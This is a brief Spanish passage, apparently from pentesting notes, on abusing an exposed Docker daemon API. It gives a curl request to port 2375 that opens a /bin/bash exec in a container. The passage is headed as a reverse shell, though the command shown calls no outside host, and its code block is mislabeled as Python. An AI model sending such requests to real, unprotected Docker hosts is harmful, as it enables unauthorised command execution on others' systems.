
Docker en si es un daemon que expone localmente una API REST, con la cual el CLI o el Docker Desktop interactuan, que quiere decir esto? bueno, basicamente que podemos hacer cualquier cosa que hariamos con el CLI o desde Docker Desktop pero con curl haciendo peticiones web:

### Ejecutar Reverse Shell

Cuando creamos un contenedor podemos especificar un comando a ejecutar 

```python
curl -X POST -H "Content-Type: application/json" \  
http://192.168.65.7:2375/containers/<container_id>/exec \  
-d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/bash"],"DetachKeys":"ctrl-p,ctrl-q","Privileged":false,"Tty":true}'
```